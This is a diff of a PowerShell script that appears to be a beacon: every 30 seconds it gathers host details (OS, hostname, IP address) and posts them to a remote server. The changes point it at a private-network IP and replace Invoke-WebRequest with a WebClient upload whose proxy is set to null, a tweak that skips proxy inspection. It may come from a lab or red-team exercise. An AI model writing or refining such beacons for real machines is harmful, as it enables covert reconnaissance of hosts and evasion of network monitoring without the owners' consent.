@@ -1,11 +1,11 @@
-$ServerIP = "127.0.0.1"
+$ServerIP = "172.16.225.135"
 $ServerPort = "8080"
 $IntervalSec = 30
-$Endpoint = "http://${ServerIP}:${ServerPort}/"
+$Endpoint = "http://" + $ServerIP + ":" + $ServerPort + "/"
 
 function Get-Payload {
     $os = Get-CimInstance Win32_OperatingSystem
-    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress
+    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127.*" } | Select-Object -First 1).IPAddress
     $payload = @"
 === System Info ===
 Hostname: $env:COMPUTERNAME
@@ -20,7 +20,10 @@ Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
 function Send-Payload {
     $payload = Get-Payload
     try {
-        Invoke-WebRequest -Uri $Endpoint -Method Post -Body @{ data = $payload } -UseBasicParsing -TimeoutSec 10 | Out-Null
+        $wc = New-Object System.Net.WebClient
+        $wc.Proxy = $null
+        $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+        $resp = $wc.UploadString($Endpoint, "data=" + [uri]::EscapeDataString($payload))
         Write-Host "[+] Sent successfully at $(Get-Date -Format 'HH:mm:ss')"
     } catch {
         Write-Host "[!] Failed to reach server at $(Get-Date -Format 'HH:mm:ss')"
